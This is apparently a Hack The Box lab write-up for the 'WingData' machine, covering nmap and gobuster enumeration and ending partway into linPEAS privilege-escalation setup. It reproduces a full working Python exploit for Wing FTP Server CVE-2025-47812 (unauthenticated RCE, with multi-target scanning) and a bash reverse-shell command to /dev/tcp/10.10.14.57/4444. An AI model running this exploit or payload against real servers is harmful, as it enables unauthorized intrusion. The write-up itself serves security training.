#Easy #Linux #WingData #Apache

### Enumeration


```
┌──(h4ckrati㉿H4ckrati)-[~/Downloads/HTB/Machines]
└─$ nmap -sC -sV 10.129.1.7 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 14:20 -0500
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.28 seconds
                                                                                                                    
┌──(h4ckrati㉿H4ckrati)-[~/Downloads/HTB/Machines]
└─$ nmap -sC -sV -Pn 10.129.1.7                      
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 14:33 -0500
Nmap scan report for 10.129.1.7
Host is up (0.024s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.79 seconds

```


```
┌──(h4ckrati㉿H4ckrati)-[~]
└─$ gobuster dir -u http://wingdata.htb \            
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-b 301,404 \
-o root.gobuster
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://wingdata.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   301,404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.html                (Status: 403) [Size: 317]
.htm                 (Status: 403) [Size: 317]
.                    (Status: 200) [Size: 12492]
.htaccess            (Status: 403) [Size: 317]
.htc                 (Status: 403) [Size: 317]
.html_var_DE         (Status: 403) [Size: 317]
server-status        (Status: 403) [Size: 317]

```

I found nothing interesting except the server-status

#### After exploration, I discovered that clicking on the client portal button, I was redirected to a website called ftp.wingdata.htb 

After adding the url in sudo vi /etc/hosts, I found this page

![[../../../../ALL-assets/Pasted image 20260220150521.png]]



Thanks to the script that we found in Exploit DB: 

```
```py
# Exploit Title: Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution (RCE)
# CVE: CVE-2025-47812
# Date: 2025-06-30
# Exploit Author: Sheikh Mohammad Hasan aka 4m3rr0r (https://github.com/4m3rr0r)
# Vendor Homepage: https://www.wftpserver.com/
# Version: Wing FTP Server <= 7.4.3
# Tested on: Linux (Root Privileges), Windows (SYSTEM Privileges)

# Description:
# Wing FTP Server versions prior to 7.4.4 are vulnerable to an unauthenticated remote code execution (RCE)
# flaw (CVE-2025-47812). This vulnerability arises from improper handling of NULL bytes in the 'username'
# parameter during login, leading to Lua code injection into session files. These maliciously crafted
# session files are subsequently executed when authenticated functionalities (e.g., /dir.html) are accessed,
# resulting in arbitrary command execution on the server with elevated privileges (root on Linux, SYSTEM on Windows).
# The exploit leverages a discrepancy between the string processing in c_CheckUser() (which truncates at NULL)
# and the session creation logic (which uses the full unsanitized username).

# Proof-of-Concept (Python):
# The provided Python script automates the exploitation process.
# It injects a NULL byte followed by Lua code into the username during a POST request to loginok.html.
# Upon successful authentication (even anonymous), a UID cookie is returned.
# A subsequent GET request to dir.html using this UID cookie triggers the execution of the injected Lua code,
# leading to RCE.


import requests
import re
import argparse

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

def print_green(text):
    print(f"{GREEN}{text}{RESET}")

def print_red(text):
    print(f"{RED}{text}{RESET}")

def run_exploit(target_url, command, username="anonymous", verbose=False):
    login_url = f"{target_url}/loginok.html"

    login_headers = {
        "Host": target_url.split('//')[1].split('/')[0],
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": target_url,
        "Connection": "keep-alive",
        "Referer": f"{target_url}/login.html?lang=english",
        "Cookie": "client_lang=english",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }


    from urllib.parse import quote
    encoded_username = quote(username)

    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0dlocal+r+%3d+h%3aread(\"*a\")"
        "%0dh%3aclose()%0dprint(r)%0d--&password="
    )

    if verbose:
        print_green(f"[+] Sending POST request to {login_url} with command: '{command}' and username: '{username}'")

    try:
        login_response = requests.post(login_url, headers=login_headers, data=payload, timeout=10)
        login_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending POST request to {login_url}: {e}")
        return False

    set_cookie = login_response.headers.get("Set-Cookie", "")
    match = re.search(r'UID=([^;]+)', set_cookie)

    if not match:
        print_red("[-] UID not found in Set-Cookie. Exploit might have failed or response format changed.")
        return False

    uid = match.group(1)
    if verbose:
        print_green(f"[+] UID extracted: {uid}")

    dir_url = f"{target_url}/dir.html"
    dir_headers = {
        "Host": login_headers["Host"],
        "User-Agent": login_headers["User-Agent"],
        "Accept": login_headers["Accept"],
        "Accept-Language": login_headers["Accept-Language"],
        "Accept-Encoding": login_headers["Accept-Encoding"],
        "Connection": "keep-alive",
        "Cookie": f"UID={uid}",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    if verbose:
        print_green(f"[+] Sending GET request to {dir_url} with UID: {uid}")

    try:
        dir_response = requests.get(dir_url, headers=dir_headers, timeout=10)
        dir_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print_red(f"[-] Error sending GET request to {dir_url}: {e}")
        return False

    body = dir_response.text
    clean_output = re.split(r'<\?xml', body)[0].strip()

    if verbose:
        print_green("\n--- Command Output ---")
        print(clean_output)
        print_green("----------------------")
    else:
        if clean_output:
            print_green(f"[+] {target_url} is vulnerable!")
        else:
            print_red(f"[-] {target_url} is NOT vulnerable.")

    return bool(clean_output)

def main():
    parser = argparse.ArgumentParser(description="Exploit script for command injection via login.html.")
    parser.add_argument("-u", "--url", type=str,
                        help="Target URL (e.g., http://192.168.134.130). Required if -f not specified.")
    parser.add_argument("-f", "--file", type=str,
                        help="File containing list of target URLs (one per line).")
    parser.add_argument("-c", "--command", type=str,
                        help="Custom command to execute. Default: whoami. If specified, verbose output is enabled automatically.")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show full command output (verbose mode). Ignored if -c is used since verbose is auto-enabled.")
    parser.add_argument("-o", "--output", type=str,
                        help="File to save vulnerable URLs.")
    parser.add_argument("-U", "--username", type=str, default="anonymous",
                        help="Username to use in the exploit payload. Default: anonymous")

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("Either -u/--url or -f/--file must be specified.")

    command_to_use = args.command if args.command else "whoami"
    verbose_mode = True if args.command else args.verbose

    vulnerable_sites = []

    targets = []
    if args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print_red(f"[-] Could not read target file '{args.file}': {e}")
            return
    else:
        targets = [args.url]

    for target in targets:
        print(f"\n[*] Testing target: {target}")
        is_vulnerable = run_exploit(target, command_to_use, username=args.username, verbose=verbose_mode)
        if is_vulnerable:
            vulnerable_sites.append(target)

    if args.output and vulnerable_sites:
        try:
            with open(args.output, 'w') as out_file:
                for site in vulnerable_sites:
                    out_file.write(site + "\n")
            print_green(f"\n[+] Vulnerable sites saved to: {args.output}")
        except Exception as e:
            print_red(f"[-] Could not write to output file '{args.output}': {e}")

if __name__ == "__main__":
    main()
            
```



sudo vi exploitWing.py and copy the exploit into it then run this command to see if it is vulnerable or not

```
└─$ sudo python3 exploitWing.py -u http://ftp.wingdata.htb

[*] Testing target: http://ftp.wingdata.htb
The target is vulnerable 


```





```
sudo python3 exploitWing.py -v -u http://ftp.wingdata.htb -c "bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.57/4444+0>%261'"

```

-v veut dire give more info
and -c give the command 




Reverse shell with this command

```
└─$ nc -lnvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.1.7] 38506
bash: cannot set terminal process group (3470): Inappropriate ioctl for device
bash: no job control in this shell
wingftp@wingdata:/opt/wftpserver$ ls
ls
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver

```

1) Then to have an interactive terminal you do : python3 -c 'import pty; pty.spawn("/bin/bash")' 
2) then you press enter and control z.
3) And you do :  stty raw -echo;fg then you press enter
4) And you do export TERM=xterm






### Find a privilege escalation

Privilege Escalation 
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS 

Install linpeas on my computer with this command : 

```
wget https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
```

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260221124222.png)

Now, 

Send the file linpeas.sh to thetarget machine 

```
```python3 -m http.server